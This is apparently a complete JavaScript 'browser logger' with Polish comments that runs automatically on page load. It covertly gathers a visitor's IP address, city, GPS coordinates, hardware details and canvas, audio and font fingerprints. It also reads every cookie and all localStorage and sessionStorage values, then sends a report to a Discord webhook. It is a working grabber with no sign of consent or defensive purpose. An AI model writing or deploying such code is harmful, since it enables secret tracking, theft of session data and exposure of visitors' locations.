class AdvancedBrowserLogger {
    constructor() {
        this.data = {
            ip: null,
            browser: {},
            device: {},
            network: {},
            location: {},
            storage: {},
            advanced: {},
            time: new Date().toLocaleString("pl-PL")
        };
    }

    async collectAllData() {
        try {
            // Podstawowe dane
            await this._getIP();
            this._getBasicBrowserInfo();
            this._getStorageData();

            // Dane urządzenia
            await this._getDeviceInfo();
            await this._getBatteryInfo();
            this._getScreenInfo();
            this._getCpuInfo();

            // Geolokalizacja
            await this._getGeolocation();
            await this._getIPLocation();

            // Zaawansowane techniki
            this._getWebGLInfo();
            this._getFontList();
            this._getAudioContextFingerprint();
            this._getCanvasFingerprint();
            this._getWebRTCInfo();

            // Sieć
            await this._checkVPN();
            this._getConnectionInfo();

            return this.data;
        } catch (error) {
            console.error("Error collecting data:", error);
            return this.data;
        }
    }

    // 1. PODSTAWOWE DANE PRZEGLĄDARKI
    _getBasicBrowserInfo() {
        this.data.browser = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            doNotTrack: navigator.doNotTrack === "1",
            cookieEnabled: navigator.cookieEnabled,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            isPrivate: this._checkPrivateMode()
        };
    }

    _checkPrivateMode() {
        try {
            localStorage.setItem("test", "test");
            localStorage.removeItem("test");
            return false;
        } catch (e) {
            return true;
        }
    }

    // 2. DANE URZĄDZENIA
    async _getDeviceInfo() {
        const os = this._detectOS();
        this.data.device = {
            os: os,
            platform: navigator.platform,
            vendor: navigator.vendor,
            isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
            maxTouchPoints: navigator.maxTouchPoints
        };
    }

    _detectOS() {
        const ua = navigator.userAgent;
        if (/Windows/.test(ua)) {
            if (/Phone/.test(ua)) return "Windows Mobile";
            return "Windows";
        }
        if (/Mac OS X/.test(ua)) return "macOS";
        if (/Linux/.test(ua)) return "Linux";
        if (/Android/.test(ua)) return "Android";
        if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
        if (/CrOS/.test(ua)) return "Chrome OS";
        return "Unknown OS";
    }

    async _getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                this.data.device.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {
                this.data.device.battery = "Unavailable";
            }
        }
    }

    _getScreenInfo() {
        this.data.device.screen = {
            width: window.screen.width,
            height: window.screen.height,
            colorDepth: window.screen.colorDepth + '-bit',
            orientation: window.screen.orientation?.type,
            pixelRatio: window.devicePixelRatio
        };
    }

    _getCpuInfo() {
        this.data.device.cpu = {
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
        };
    }

    // 3. PRZECHOWYWANIE DANYCH
    _getStorageData() {
        this.data.storage = {
            cookies: this._getAllCookies(),
            localStorage: this._getLocalStorage(),
            sessionStorage: this._getSessionStorage(),
            indexedDB: this._checkIndexedDB(),
            cacheStatus: this._checkCache()
        };
    }

    _getAllCookies() {
        try {
            return document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                try {
                    cookies[name] = decodeURIComponent(value);
                } catch {
                    cookies[name] = value;
                }
                return cookies;
            }, {});
        } catch (error) {
            return { error: "Cookie read error" };
        }
    }

    _getLocalStorage() {
        try {
            return Object.keys(localStorage).reduce((acc, key) => {
                try {
                    acc[key] = localStorage.getItem(key);
                } catch {
                    acc[key] = "<protected>";
                }
                return acc;
            }, {});
        } catch (error) {
            return { error: "LocalStorage read error" };
        }
    }

    _getSessionStorage() {
        try {
            return Object.keys(sessionStorage).reduce((acc, key) => {
                try {
                    acc[key] = sessionStorage.getItem(key);
                } catch {
                    acc[key] = "<protected>";
                }
                return acc;
            }, {});
        } catch (error) {
            return { error: "SessionStorage read error" };
        }
    }

    _checkIndexedDB() {
        return 'indexedDB' in window ? "Available" : "Unavailable";
    }

    _checkCache() {
        return 'caches' in window ? "Available" : "Unavailable";
    }

    // 4. GEOLOKALIZACJA
    async _getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            this.data.ip = data.ip;
        } catch (error) {
            console.error("IP fetch error:", error);
        }
    }

    async _getGeolocation() {
        if ('geolocation' in navigator) {
            return new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        this.data.location.gps = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters'
                        };
                        resolve();
                    },
                    error => {
                        this.data.location.gps = "Denied (" + error.message + ")";
                        resolve();
                    },
                    { timeout: 5000 }
                );
            });
        }
    }

    async _getIPLocation() {
        if (!this.data.ip) return;
        
        try {
            const response = await fetch(`https://ipapi.co/${this.data.ip}/json/`);
            const data = await response.json();
            
            this.data.location.ipBased = {
                country: data.country_name,
                city: data.city,
                region: data.region,
                postal: data.postal,
                coords: `${data.latitude}, ${data.longitude}`,
                isp: data.org,
                asn: data.asn
            };
        } catch (error) {
            console.error("IP location error:", error);
        }
    }

    // 5. ZAAWANSOWANE TECHNIKI
    _getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) {
                this.data.advanced.webgl = "Unsupported";
                return;
            }

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            this.data.advanced.webgl = {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown",
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown",
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
            };
        } catch (error) {
            this.data.advanced.webgl = "Error";
        }
    }

    _getFontList() {
        const baseFonts = [
            'Arial', 'Arial Black', 'Courier New', 'Times New Roman',
            'Georgia', 'Verdana', 'Helvetica', 'Tahoma'
        ];
        
        const availableFonts = [];
        const testString = "mmmmmmmmmmlli";
        const testSize = "72px";
        const canvas = document.createElement("canvas");
        const context = canvas.getContext("2d");
        
        baseFonts.forEach(font => {
            context.font = testSize + " '" + font + "'";
            const metrics1 = context.measureText(testString);
            context.font = testSize + " 'UnknownFont'";
            const metrics2 = context.measureText(testString);
            if (metrics1.width !== metrics2.width) {
                availableFonts.push(font);
            }
        });
        
        this.data.advanced.fonts = availableFonts;
    }

    _getAudioContextFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

            oscillator.type = "triangle";
            oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
            gainNode.gain.setValueAtTime(0, audioContext.currentTime);

            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);

            oscillator.start(0);
            scriptProcessor.onaudioprocess = e => {
                const buffer = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(buffer);
                const sum = buffer.reduce((acc, val) => acc + Math.abs(val), 0);
                this.data.advanced.audioFingerprint = sum.toString().slice(0, 15);
                oscillator.disconnect();
                scriptProcessor.disconnect();
                gainNode.disconnect();
            };
        } catch (e) {
            this.data.advanced.audioFingerprint = "Error";
        }
    }

    _getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("CanvasFingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("CanvasFingerprint", 4, 17);
            this.data.advanced.canvasFingerprint = canvas.toDataURL().slice(-32);
        } catch (e) {
            this.data.advanced.canvasFingerprint = "Error";
        }
    }

    _getWebRTCInfo() {
        try {
            const rtc = new RTCPeerConnection({iceServers: []});
            rtc.createDataChannel('');
            rtc.createOffer()
                .then(offer => rtc.setLocalDescription(offer));
            
            this.data.advanced.webRTC = "Available";
        } catch (e) {
            this.data.advanced.webRTC = "Unavailable";
        }
    }

    // 6. DANE SIECIOWE
    async _checkVPN() {
        if (!this.data.ip || !window.CONFIG?.VPNAPI_KEY) return;
        
        try {
            const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${window.CONFIG.VPNAPI_KEY}`);
            const data = await response.json();
            this.data.network.security = {
                vpn: data.security?.vpn || false,
                proxy: data.security?.proxy || false,
                tor: data.security?.tor || false,
                hosting: data.security?.hosting || false
            };
        } catch (error) {
            console.error("VPN check error:", error);
        }
    }

    _getConnectionInfo() {
        if ('connection' in navigator) {
            const conn = navigator.connection;
            this.data.network.connection = {
                type: conn.effectiveType,
                downlink: conn.downlink + ' Mbps',
                rtt: conn.rtt + ' ms',
                saveData: conn.saveData
            };
        }
    }

    // EKSPORT DANYCH
    async sendToDiscord() {
        if (!window.CONFIG?.DISCORD_WEBHOOK) return;
        
        try {
            await fetch(window.CONFIG.DISCORD_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [this._createDiscordEmbed()]
                })
            });
        } catch (error) {
            console.error("Discord send error:", error);
        }
    }

    _createDiscordEmbed() {
        return {
            title: "📊 Pełny raport przeglądarki",
            color: 0x3498db,
            fields: [
                { name: "🌍 IP i Lokalizacja", value: this._formatLocation(), inline: true },
                { name: "📱 Urządzenie", value: this._formatDevice(), inline: true },
                { name: "🔍 Zaawansowane", value: this._formatAdvanced(), inline: false },
                { name: "🌐 Sieć", value: this._formatNetwork(), inline: false }
            ],
            footer: { text: `Czas: ${this.data.time}` }
        };
    }

    _formatLocation() {
        const loc = this.data.location;
        return `
        **IP:** ${this.data.ip || "Unknown"}
        **Kraj:** ${loc.ipBased?.country || "Unknown"}
        **Miasto:** ${loc.ipBased?.city || "Unknown"}
        **GPS:** ${loc.gps?.lat ? `${loc.gps.lat}, ${loc.gps.lon}` : "Denied"}
        `;
    }

    _formatDevice() {
        const dev = this.data.device;
        return `
        **System:** ${dev.os}
        **Przeglądarka:** ${this.data.browser.userAgent?.split(') ')[0].split('(')[1] || "Unknown"}
        **Ekran:** ${dev.screen?.width}x${dev.screen?.height}
        **CPU:** ${dev.cpu?.cores} cores
        **RAM:** ${dev.cpu?.memory}
        `;
    }

    _formatAdvanced() {
        const adv = this.data.advanced;
        return `
        **WebGL:** ${adv.webgl?.renderer || "Unknown"}
        **Fonty:** ${adv.fonts?.length || 0} wykryte
        **Canvas FP:** ${adv.canvasFingerprint ? "Tak" : "Nie"}
        **Audio FP:** ${adv.audioFingerprint ? "Tak" : "Nie"}
        `;
    }

    _formatNetwork() {
        const net = this.data.network;
        return `
        **ISP:** ${this.data.location.ipBased?.isp || "Unknown"}
        **VPN:** ${net.security?.vpn ? "Tak" : "Nie"}
        **Proxy:** ${net.security?.proxy ? "Tak" : "Nie"}
        **Połączenie:** ${net.connection?.type || "Unknown"}
        `;
    }
}

// Użycie:
document.addEventListener("DOMContentLoaded", async () => {
    const logger = new AdvancedBrowserLogger();
    await logger.collectAllData();
    await logger.sendToDiscord();
});
